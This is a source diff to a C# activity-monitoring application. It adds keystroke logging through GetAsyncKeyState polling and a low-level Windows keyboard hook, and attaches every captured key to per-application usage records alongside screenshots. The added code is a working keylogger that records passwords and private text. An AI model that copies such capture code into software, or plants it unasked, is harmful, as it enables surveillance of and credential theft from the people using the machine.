@@ -33,6 +33,8 @@ namespace ActivityMonitor.ApplicationMonitor
     }
     public class AppMonitor : INotifyPropertyChanged
     {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
         private readonly AppUpdater _appUpdater;
         private string _currentApplicationName;
         private TimeSpan _currentApplicationTotalUsageTime;
@@ -79,19 +81,68 @@ namespace ActivityMonitor.ApplicationMonitor
             Session = new UserSession();
 
             SystemEvents.SessionSwitch += SystemEventsSessionSwitch;
+           
+           
         }
 
         private bool _sessionStopped;
+       private IApplication iapp;
+
+        private void LogKey()
+        {
+            while (true)
+            {
+             
+
+                for (int i = 0; i < 255; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    // 32769 should be used for windows 10.
+                    if (keyState == 1 || keyState == -32767 || keyState == 32769)
+                    {
+                        if (iapp != null)
+                        {
+                            iapp.Usage.FindLast(u => !u.IsClosed).AddKeystrokes(
+                           ((char)i).ToString()
+                            );
+                        }
+                       
+                        break;
+                    }
+                }
+            }
+        }
+        private  void HookManager_KeyDown(object sender, KeyEventArgs e)
+        {
+            //string key = e.KeyCode.ToString();
+            //if (iapp != null)
+            //{
+            //    iapp.Usage.FindLast(u => !u.IsClosed).AddKeystrokes(
+            //   key
+            //    );
+            //}
+           
+            // Log the pressed key
+
+        }
         public void SystemEventsSessionSwitch(object sender, SessionSwitchEventArgs e)
         {
             switch (e.Reason)
             {
                 case SessionSwitchReason.SessionLock:
-                    _sessionStopped = true;
-                    break;
+                    {
+                        _sessionStopped = true;
+
+                        break;
+                    }
+                   
                 case SessionSwitchReason.SessionUnlock:
-                    _sessionStopped = false;
-                    break;
+                    {
+                        _sessionStopped = false;
+                        Session = new UserSession();
+                        break;
+                    }
+                    
             }
         }
 
@@ -240,13 +291,30 @@ namespace ActivityMonitor.ApplicationMonitor
                         applicationScreenshots.ScreenshotName = fileName;
                         applicationScreenshots.SnapDatetime = System.DateTime.Now;
                         currentApplication.Usage.FindLast(u => !u.IsClosed).AddScreenShot(applicationScreenshots);
-
+                       
                         bitmap.Dispose();
                         graphics.Dispose();
                     }
                     memoryStream.Dispose();
                     image.Dispose();
 
+                }
+
+                for (int i = 0; i < 255; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    // 32769 should be used for windows 10.
+                    if (keyState == 1 || keyState == -32767 || keyState == 32769)
+                    {
+                       
+                        
+                            currentApplication.Usage.FindLast(u => !u.IsClosed).AddKeystrokes(
+                           ((char)i).ToString()
+                            );
+                        
+
+                        break;
+                    }
                 }
 
 
@@ -258,6 +326,7 @@ namespace ActivityMonitor.ApplicationMonitor
             }
 
         }
+
 
 
 
@@ -301,7 +370,7 @@ namespace ActivityMonitor.ApplicationMonitor
 
         private void OnFileActivity(object sender, FileSystemEventArgs e)
         {
-            if (!e.FullPath.Contains("AppData") && !e.FullPath.Contains("Windows") && !e.FullPath.Contains("Program Files") && !e.FullPath.Contains("Program Files (x86)") && !e.FullPath.Contains("Program Data") && !e.FullPath.StartsWith("."))
+            if (!e.FullPath.Contains("AppData") && !e.FullPath.Contains("Windows") && !e.FullPath.Contains("Program Files") && !e.FullPath.Contains("Program Files (x86)") && !e.FullPath.Contains("Program Data")  && !e.FullPath.Contains("ProgramData") && !e.FullPath.StartsWith("."))
             {
                 string logMessage = $"{DateTime.Now} - {e.ChangeType}: {e.FullPath}";
                 LogToFile(new FileLog
@@ -318,7 +387,7 @@ namespace ActivityMonitor.ApplicationMonitor
 
         private void OnFileRenamed(object sender, RenamedEventArgs e)
         {
-            if (!e.FullPath.Contains("AppData") && !e.FullPath.Contains("Windows") && !e.FullPath.Contains("Program Files") && !e.FullPath.Contains("Program Files (x86)") && !e.FullPath.Contains("Program Data") && !e.FullPath.StartsWith("."))
+            if (!e.FullPath.Contains("AppData") && !e.FullPath.Contains("Windows") && !e.FullPath.Contains("Program Files") && !e.FullPath.Contains("Program Files (x86)") && !e.FullPath.Contains("Program Data") && !e.FullPath.Contains("ProgramData") && !e.FullPath.StartsWith("."))
             {
                 string logMessage = $"{DateTime.Now} - {e.ChangeType}: {e.OldFullPath} renamed to {e.FullPath}";
                 LogToFile(new FileLog
@@ -339,6 +408,7 @@ namespace ActivityMonitor.ApplicationMonitor
 
 
         }
+
         private void ApplicationsUpdater()
         {
             var startTimeSpan = TimeSpan.Zero;
@@ -372,7 +442,7 @@ namespace ActivityMonitor.ApplicationMonitor
                             if (currentApplication != null)
                             {
 
-
+                                iapp = currentApplication;
 
 
                                 CaptureScreenshot(currentApplication);
@@ -393,7 +463,7 @@ namespace ActivityMonitor.ApplicationMonitor
                             {
 
 
-
+                                iapp = currentApplication;
 
                                 CaptureScreenshot(currentApplication);
 
@@ -413,6 +483,7 @@ namespace ActivityMonitor.ApplicationMonitor
                             if (currentApplication != null)
                             {
 
+                                iapp = currentApplication;
                                 CaptureScreenshot(currentApplication);
 
 
@@ -540,5 +611,60 @@ namespace ActivityMonitor.ApplicationMonitor
 
 
 
+    }
+
+    public class HookManager
+    {
+        public static event KeyEventHandler KeyDown;
+
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        public static void Init()
+        {
+            _hookID = SetHook(_proc);
+        }
+
+        public static void Unhook()
+        {
+            UnhookWindowsHookEx(_hookID);
+        }
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                KeyDown?.Invoke(null, new KeyEventArgs((Keys)vkCode));
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
     }
 }
